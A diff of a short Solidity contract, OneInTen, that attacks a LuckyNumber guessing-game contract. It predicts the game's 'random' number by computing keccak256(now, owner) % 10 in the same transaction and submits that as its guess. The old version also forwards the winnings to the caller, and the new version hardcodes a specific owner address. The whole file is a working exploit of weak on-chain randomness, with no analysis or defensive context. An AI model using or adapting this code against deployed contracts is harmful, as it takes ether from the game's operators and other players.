@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract OneInTen at 0x64bb42f7012cbfef9e036dd8929cbc9d61c7c3ca
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract OneInTen at 0x51e6263bef3970485b1545d4ca181749d9b19875
 */
 pragma solidity ^0.4.20;
 
@@ -8,13 +8,7 @@ contract LuckyNumber {
 }
 
 contract OneInTen {
-  function call_lucky(address contract_address, address contract_owner) public payable {
-    uint8 guess = uint8(keccak256(now, contract_owner)) % 10;
-    LuckyNumber(contract_address).takeAGuess.value(msg.value)(guess);
-    require(this.balance > 0);
-    msg.sender.transfer(this.balance);
-  }
-  
-  function() payable external {
+  function call(address contract_address) public payable {
+    LuckyNumber(contract_address).takeAGuess.value(msg.value)(uint8(keccak256(now, address(0xd777c3F176D125962C598E8e1162E52c6C403606)))%10);
   }
 }
